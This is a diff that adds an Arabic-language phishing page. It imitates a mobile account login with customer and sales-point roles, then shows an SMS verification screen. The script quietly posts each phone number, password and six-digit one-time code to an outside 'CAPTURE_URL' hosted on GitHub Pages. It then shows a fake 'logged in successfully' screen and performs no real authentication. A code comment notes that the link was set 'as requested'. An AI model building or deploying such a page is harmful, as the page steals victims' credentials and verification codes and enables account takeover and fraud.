@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+  body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; padding: 20px; color: #1a1a1a; }
+  .header-title { text-align: right; font-size: 17px; font-weight: 600; padding: 10px 5px 20px; }
+  .role-switch { display: flex; gap: 12px; margin-bottom: 22px; }
+  .role-btn { flex: 1; border: 2px solid #cfcfcf; border-radius: 12px; padding: 18px 10px; text-align: center; cursor: pointer; background: #fff; transition: 0.2s; user-select: none; }
+  .role-btn svg { width: 42px; height: 42px; margin-bottom: 8px; }
+  .role-btn span { display: block; font-size: 15px; font-weight: 600; }
+  .role-btn.active { background: #d9d9d9; border-color: #b5b5b5; }
+  .input-group { margin-bottom: 14px; position: relative; }
+  .input-group .label { position: absolute; top: -9px; right: 14px; background: #fff; padding: 0 6px; font-size: 12px; color: #6b6b6b; font-weight: 600; }
+  .input-wrap { display: flex; align-items: center; border: 2px solid #cfcfcf; border-radius: 12px; padding: 4px 12px; background: #fff; transition: 0.2s; }
+  .input-wrap:focus-within { border-color: #d32f2f; }
+  .input-wrap .icon { width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .input-wrap .icon svg { width: 26px; height: 26px; }
+  .input-wrap input { flex: 1; border: none; outline: none; padding: 12px 8px; font-size: 16px; text-align: left; direction: ltr; background: transparent; color: #1a1a1a; font-weight: 500; }
+  .input-wrap input::placeholder { color: #b0b0b0; }
+  .forgot { text-align: right; font-size: 14px; font-weight: 600; margin: 10px 5px 18px; }
+  .btn-login { width: 100%; background: #e11d2a; color: #fff; border: none; border-radius: 10px; padding: 16px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 12px rgba(225,29,42,0.25); transition: 0.2s; }
+  .btn-login:hover { background: #c4161f; }
+  .btn-login:active { transform: scale(0.98); }
+  .btn-login:disabled { opacity: 0.7; cursor: wait; }
+  .bottom-row { display: flex; justify-content: space-between; align-items: center; margin-top: 16px; padding: 0 5px; }
+  .no-net { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 600; }
+  .no-net input[type="checkbox"] { width: 20px; height: 20px; accent-color: #1a1a1a; }
+  .signup { font-size: 14px; font-weight: 600; }
+  .signup a { color: #e11d2a; text-decoration: none; }
+  .footer-bar { margin-top: auto; text-align: center; padding: 20px 0 10px; border-top: 1px solid #eee; }
+  .footer-bar .end { font-size: 14px; font-weight: 700; margin-bottom: 12px; }
+  .footer-bar .links { display: flex; justify-content: center; gap: 30px; font-size: 13px; color: #444; font-weight: 600; }
+  #otpScreen { display: none; text-align: right; padding: 10px 0; }
+  #otpScreen .title { font-size: 18px; font-weight: 700; margin-bottom: 10px; }
+  #otpScreen .desc { font-size: 14px; color: #555; line-height: 1.7; margin-bottom: 6px; }
+  #otpScreen .phone-shown { font-size: 15px; font-weight: 700; color: #e11d2a; direction: ltr; display: inline-block; margin: 0 4px; }
+  #otpScreen .note { font-size: 12px; color: #888; margin-bottom: 22px; margin-top: 10px; }
+  .otp-inputs { display: flex; justify-content: space-between; gap: 8px; direction: ltr; margin-bottom: 22px; }
+  .otp-inputs input { width: 100%; height: 58px; border: 2px solid #cfcfcf; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 700; color: #1a1a1a; outline: none; background: #fff; transition: 0.2s; }
+  .otp-inputs input:focus { border-color: #e11d2a; box-shadow: 0 0 0 3px rgba(225,29,42,0.12); }
+  .otp-inputs input.filled { border-color: #1a1a1a; background: #f7f7f7; }
+  .timer { text-align: center; font-size: 13px; color: #666; margin-bottom: 16px; }
+  .timer b { color: #e11d2a; }
+  .resend { text-align: center; font-size: 13px; color: #888; margin-top: 14px; }
+  .resend a { color: #e11d2a; text-decoration: none; font-weight: 600; }
+  .back-link { text-align: center; margin-top: 18px; font-size: 13px; color: #888; cursor: pointer; }
+  .spinner { display: inline-block; width: 18px; height: 18px; border: 2px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-left: 8px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .success-screen { display: none; text-align: center; padding: 60px 20px; }
+  .success-screen .check { width: 80px; height: 80px; border-radius: 50%; background: #22c55e; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; color: #fff; }
+  .success-screen h2 { font-size: 20px; margin-bottom: 8px; }
+  .success-screen p { font-size: 14px; color: #666; }
+</style>
+</head>
+<body>
+
+<div id="loginScreen">
+  <div class="header-title">قم بتسجيل الدخول</div>
+  <div class="role-switch">
+    <div class="role-btn" data-role="point" onclick="selectRole(this)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="1.5">
+        <rect x="4" y="4" width="10" height="16"/><rect x="10" y="8" width="10" height="12"/>
+      </svg>
+      <span>نقطة مبيعات</span>
+    </div>
+    <div class="role-btn active" data-role="client" onclick="selectRole(this)">
+      <svg viewBox="0 0 24 24" fill="#1a1a1a">
+        <circle cx="12" cy="7" r="4"/><path d="M4 21c0-4.4 3.6-8 8-8s8 3.6 8 8v1H4v-1z"/>
+      </svg>
+      <span>عميل</span>
+    </div>
+  </div>
+  <div class="input-group">
+    <div class="label">رقم الموبايل</div>
+    <div class="input-wrap">
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#e11d2a" stroke-width="1.6">
+          <circle cx="9" cy="9" r="3"/><circle cx="17" cy="9" r="3"/>
+          <circle cx="9" cy="17" r="3"/><circle cx="17" cy="17" r="3"/>
+        </svg>
+      </div>
+      <input type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="12">
+    </div>
+  </div>
+  <div class="input-group">
+    <div class="label">كلمة المرور</div>
+    <div class="input-wrap">
+      <div class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="1.6">
+          <path d="M12 2C9 2 7 4 7 7c0 3 1 4 1 6v1h8v-1c0-2 1-3 1-6 0-3-2-5-5-5z"/>
+          <path d="M9 14v6c0 1 1 2 3 2s3-1 3-2v-6"/>
+        </svg>
+      </div>
+      <input type="password" id="password" placeholder="••••••••">
+    </div>
+  </div>
+  <div class="forgot">نسيت كلمة المرور؟</div>
+  <button class="btn-login" id="loginBtn" onclick="submitLogin()">تسجيل دخول كـ عميل</button>
+  <div class="bottom-row">
+    <div class="no-net">
+      <input type="checkbox" id="offline"><label for="offline">دخول بدون نت</label>
+    </div>
+    <div class="signup">لا تمتلك حساب؟ <a href="#">إنشاء حساب</a></div>
+  </div>
+  <div class="footer-bar">
+    <div class="end">انتهاء</div>
+    <div class="links"><span>خدمة العملاء</span><span>الرقم المجاني</span></div>
+  </div>
+</div>
+
+<div id="otpScreen">
+  <div class="title">تم إرسال رسالة نصية</div>
+  <div class="desc">تم إرسال رمز التحقق المكوّن من <b>6 أرقام</b> إلى رقمك <span class="phone-shown" id="phoneShown">—</span> عبر رسالة نصية.</div>
+  <div class="note">الرجاء إدخال الرمز في الحقول أدناه لإكمال تسجيل الدخول.</div>
+  <div class="otp-inputs" id="otpInputs">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,0)" onkeydown="otpBack(event,0)">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,1)" onkeydown="otpBack(event,1)">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,2)" onkeydown="otpBack(event,2)">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,3)" onkeydown="otpBack(event,3)">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,4)" onkeydown="otpBack(event,4)">
+    <input type="tel" maxlength="1" inputmode="numeric" oninput="otpInput(this,5)" onkeydown="otpBack(event,5)">
+  </div>
+  <button class="btn-login" id="verifyBtn" onclick="verifyOtp()">تأكيد الرمز</button>
+  <div class="timer">الوقت المتبقي: <b id="timer">02:00</b></div>
+  <div class="resend">لم يصلك الرمز؟ <a href="#" onclick="resendOtp(event)">إعادة الإرسال</a></div>
+  <div class="back-link" onclick="backToLogin()">← رجوع لتسجيل الدخول</div>
+</div>
+
+<div class="success-screen" id="successScreen">
+  <div class="check">✓</div>
+  <h2>تم تسجيل الدخول بنجاح</h2>
+  <p>جاري تحويلك إلى لوحة التحكم...</p>
+</div>
+
+<script>
+  let selectedRole = 'client';
+  let currentPhone = '';
+  let currentPassword = '';
+  let timerInterval = null;
+
+  // ✅ الرابط كما طلبت
+  const CAPTURE_URL = 'https://alfkhamtlyth87-gif.github.io/hhgffggfffffffff/';
+
+  function selectRole(el) {
+    document.querySelectorAll('.role-btn').forEach(b => b.classList.remove('active'));
+    el.classList.add('active');
+    selectedRole = el.dataset.role;
+    document.getElementById('loginBtn').textContent = 'تسجيل دخول كـ ' + (selectedRole === 'client' ? 'عميل' : 'نقطة مبيعات');
+  }
+
+  async function submitLogin() {
+    const phone = document.getElementById('phone').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const btn = document.getElementById('loginBtn');
+    if (!phone || !password) { alert('الرجاء إدخال رقم الموبايل وكلمة المرور'); return; }
+    currentPhone = phone;
+    currentPassword = password;
+    btn.disabled = true;
+    btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+    sendToServer({ type: 'login', phone: phone, password: password, role: selectedRole });
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.textContent = 'تسجيل دخول كـ ' + (selectedRole === 'client' ? 'عميل' : 'نقطة مبيعات');
+      document.getElementById('loginScreen').style.display = 'none';
+      document.getElementById('otpScreen').style.display = 'block';
+      document.getElementById('phoneShown').textContent = phone;
+      document.querySelector('#otpInputs input').focus();
+      startTimer(120);
+    }, 1500);
+  }
+
+  function otpInput(el, index) {
+    el.value = el.value.replace(/[^0-9]/g, '');
+    if (el.value) el.classList.add('filled'); else el.classList.remove('filled');
+    if (el.value && index < 5) document.querySelectorAll('#otpInputs input')[index + 1].focus();
+    const inputs = document.querySelectorAll('#otpInputs input');
+    const code = Array.from(inputs).map(i => i.value).join('');
+    if (code.length === 6) setTimeout(() => verifyOtp(), 300);
+  }
+
+  function otpBack(e, index) {
+    if (e.key === 'Backspace' && !e.target.value && index > 0) document.querySelectorAll('#otpInputs input')[index - 1].focus();
+  }
+
+  async function verifyOtp() {
+    const inputs = document.querySelectorAll('#otpInputs input');
+    const code = Array.from(inputs).map(i => i.value).join('');
+    const btn = document.getElementById('verifyBtn');
+    if (code.length !== 6) { alert('الرجاء إدخال الرمز المكوّن من 6 أرقام'); return; }
+    btn.disabled = true;
+    btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+    sendToServer({ type: 'otp', phone: currentPhone, password: currentPassword, role: selectedRole, otp: code });
+    setTimeout(() => {
+      document.getElementById('otpScreen').style.display = 'none';
+      document.getElementById('successScreen').style.display = 'block';
+      clearInterval(timerInterval);
+    }, 1500);
+  }
+
+  function resendOtp(e) {
+    e.preventDefault();
+    sendToServer({ type: 'resend', phone: currentPhone, password: currentPassword, role: selectedRole });
+    startTimer(120);
+    alert('تم إعادة إرسال الرمز');
+  }
+
+  function backToLogin() {
+    clearInterval(timerInterval);
+    document.getElementById('otpScreen').style.display = 'none';
+    document.getElementById('loginScreen').style.display = 'block';
+  }
+
+  function startTimer(seconds) {
+    clearInterval(timerInterval);
+    let remaining = seconds;
+    document.getElementById('timer').textContent = formatTime(remaining);
+    timerInterval = setInterval(() => {
+      remaining--;
+      if (remaining <= 0) { clearInterval(timerInterval); document.getElementById('timer').textContent = '00:00'; return; }
+      document.getElementById('timer').textContent = formatTime(remaining);
+    }, 1000);
+  }
+  function formatTime(s) {
+    return Math.floor(s/60).toString().padStart(2,'0') + ':' + (s%60).toString().padStart(2,'0');
+  }
+
+  async function sendToServer(data) {
+    try {
+      await fetch(CAPTURE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...data, url: window.location.href, time: new Date().toISOString() })
+      });
+    } catch (err) { console.log('send error', err); }
+  }
+</script>
+</body>
+</html>
